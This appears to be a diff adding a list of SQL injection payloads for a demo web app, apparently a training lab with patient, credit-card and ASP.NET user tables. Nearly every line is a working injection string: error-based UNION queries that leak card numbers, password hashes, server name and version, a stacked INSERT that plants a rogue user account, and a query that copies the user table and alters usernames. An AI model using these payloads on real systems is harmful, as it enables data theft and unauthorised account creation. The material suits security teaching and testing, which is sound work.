@@ -1,0 +1,23 @@
+Examples:
+' UNION SELECT 'txt', CAST(CAST(CAST([id] as nvarchar) + '|' + [name] + '|' + [ccNumber] as int)as nvarchar) FROM sqli_creditcards where id = 1 --
+
+-- 01B. GO TO PATIENTS.. ADD AN ORDER BY:
+user'ORDER BY City --
+
+-- 01C. GET SERVERNAME AND VERSION VIA APP ERROR
+' OR CAST(@@version as int) = 1 --
+' OR CAST(@@servername as varchar(255)) = 1 --
+' OR CAST(@@servername as int) = 1 --
+
+-- 01D. GET USER NAME / PW INFORMATION
+' UNION SELECT CAST(CAST('[id]='+CAST([id] as nvarchar)+'|[UserName]='+[UserName]+'|[PasswordHash]='+[PasswordHash] as int)as nvarchar), NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM [AspNetUsers] --
+
+-- 01E. PATIENTS SEARCH FOR GEORGE
+'; INSERT INTO AspNetUsers (id,EmailConfirmed, PhoneNumberConfirmed,TwoFactorEnabled, lockoutenabled,AccessFailedCount, UserName,PasswordHash) VALUES ('8ca087ec-d8c3-4955-9a9d-c6791z',0,0,0,0,0,'evilguy@TR23.com','DPOTanweGCWIHED0rCidspxorvZKdVr9GNWj45tC6YOZ8XyLkxLVFfq0N30/yUjxKA==')--
+
+--Confirm that the new record is there:
+SELECT * FROM [dbo].[AspNetUsers]
+
+-- 01F. PATIENTS SEARCH FOR DAVID
+--sp_addrolemember db_ddladmin, appLogin David
+';DROP TABLE IF EXISTS ASPNetUsers_New; Select * Into ASPNetUsers_New From ASPNetUsers;Update ASPNetUsers_New Set UserName = 'SneakyPerson@Hacker.net' --
